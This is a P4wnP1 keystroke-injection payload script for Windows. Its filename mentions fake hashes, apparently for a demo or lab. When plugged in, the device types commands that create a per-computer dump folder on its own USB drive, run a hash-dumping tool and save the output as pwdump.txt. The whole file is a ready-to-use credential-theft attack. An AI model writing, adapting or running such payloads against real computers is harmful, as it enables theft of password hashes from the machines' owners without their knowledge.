// WIN-D02--Payload-DumpFakeHashes.js
// Version: 2023-06-08--002


// Set keyboard layout to German (DE)
layout('DE');
typingSpeed(0,0);


// Clear screen
type("cls");
press("RETURN");


// Create directory for dumps on virtual P4wnP1 USB drive
type("set DumpPath=\"%DriveLetter%/%COMPUTERNAME%/dumps\"");
press("RETURN");
type("mkdir %DumpPath%");
press("RETURN");


// Dump password hashes
type("%DriveLetter%/Tools/DumpHashes.exe");
press("RETURN");
delay(500);
type('"%DriveLetter%/Tools/DumpHashes.exe" > "%DumpPath%/pwdump.txt"');
press("RETURN");

